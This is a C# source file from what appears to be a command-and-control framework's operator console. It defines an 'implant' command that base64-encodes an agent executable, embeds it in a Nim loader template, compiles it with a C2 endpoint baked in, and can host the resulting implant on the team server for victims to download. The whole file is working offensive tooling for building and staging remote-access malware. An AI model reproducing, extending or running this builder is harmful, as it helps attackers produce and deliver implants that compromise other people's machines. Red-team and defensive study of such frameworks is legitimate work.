using Commander.Executor;
using System;
using System.CommandLine;
using System.CommandLine.NamingConventionBinder;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Commander.Internal;
using System.IO;
using Commander.Models;
using System.Text.RegularExpressions;

namespace Commander.Commands.Laucher
{
    public class BuildEmbedderCommandCommandOptions
    {

        public string endpoint { get; set; }

        public string fileName { get; set; }

        public string save { get; set; }

        public bool debug { get; set; }

        public bool webhost { get; set; }

        public bool x86 { get; set; }

        public bool verbose { get; set; }
    }
    public class BuildEmbedderCommand : EnhancedCommand<BuildEmbedderCommandCommandOptions>
    {
        public override string Category => CommandCategory.Launcher;
        public override string Description => "Create a file embedding the agent";
        public override string Name => "implant";

        public override ExecutorMode AvaliableIn => ExecutorMode.Launcher;

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string>("endpoint", "endpoint to reach"),
            new Option<string>(new[] { "--fileName", "-f" }, () => null ,"Nome of the file to be crafted"),
            new Option<string>(new[] { "--save", "-s" }, () => null, "Folder to save the generated file"),
            new Option(new[] { "--debug", "-d" }, "Keep debugging info when building"),
            new Option(new[] { "--webhost", "-wh" }, "Host the payload on the C2 Web Host"),
            new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
        };

        protected override async Task<bool> HandleCommand(CommandContext<BuildEmbedderCommandCommandOptions> context)
        {

            var endpoint = ConnexionUrl.FromString(context.Options.endpoint);
            if (!endpoint.IsValid)
            {
                context.Terminal.WriteError($"[X] EndPoint is not valid !");
                return false;
            }

            var outFile = context.Options.fileName;
            if (string.IsNullOrEmpty(outFile))
            {
                outFile = "implant_" + endpoint.ProtocolString + "_" + Regex.Replace(endpoint.Address, @"[^\w\s]", "_");
            }
            if (!Path.GetExtension(outFile).Equals(".exe", StringComparison.OrdinalIgnoreCase))
                outFile += ".exe";

            string outPath = Path.Combine("/tmp", outFile);
            if (!string.IsNullOrEmpty(context.Options.save))
            {
                outPath = Path.Combine(context.Options.save, outFile);
            }

            var fileName = "Agent";
            if (context.Options.x86)
                fileName += "-x86";
            fileName += ".exe";

            var srcDir = BuildHelper.SourceFolder;
            string agentb64 = BuildHelper.GenerateB64(Path.Combine(srcDir, fileName));

            string nimSourceCode = string.Empty;
            using (var nimReader = new StreamReader(Path.Combine(srcDir, "embedder.nim")))
            {
                nimSourceCode = nimReader.ReadToEnd();
            }

            var payload = new StringBuilder();
            foreach (var chunk in BuildHelper.SplitIntoChunks(agentb64, 150))
            {
                payload.Append("b64 = b64 & \"");
                payload.Append(chunk);
                payload.Append("\"");
                payload.Append(Environment.NewLine);
            }

            var nimFile = "tmp" + ShortGuid.NewGuid();
            nimSourceCode = nimSourceCode.Replace("[[PAYLOAD]]", payload.ToString());


            using (var writer = new StreamWriter(Path.Combine(srcDir, nimFile + ".nim")))
            {
                writer.WriteLine(nimSourceCode);
            }


            var parms = BuildHelper.ComputeNimBuildParameters(nimFile, outPath, context.Options.debug, false);

            if (context.Options.x86)
                parms.Insert(3, $"--cpu:i386");
            else
                parms.Insert(3, $"--cpu:amd64");
            parms.Insert(4, $"-d:DotNetParams={endpoint.ToString()}");



            context.Terminal.WriteLine($"[>] Generating implant...");

            if (context.Options.verbose)
                context.Terminal.WriteLine($"[>] Executing: nim {string.Join(" ", parms)}");
            var executionResult = BuildHelper.NimBuild(parms);

            if (context.Options.verbose)
                context.Terminal.WriteLine(executionResult.Out);

            File.Delete(Path.Combine(srcDir, nimFile + ".nim"));

            if (executionResult.Result != 0)
            {
                context.Terminal.WriteError($"[X] Build Failed!");
                return false;
            }

            context.Terminal.WriteSuccess($"[*] Build succeed.");
            context.Terminal.WriteInfo($"Implat can be found at {outPath}");
            if (context.Options.webhost)
            {
                byte[] fileContent = File.ReadAllBytes(outPath);
                context.CommModule.WebHost(outFile, fileContent);

                string url = $"http(s)/teamserver/wh/{outFile}";
                context.Terminal.WriteLine($"[*] Implant hosted on : {url}");
            }

            return true;
        }
    }

}
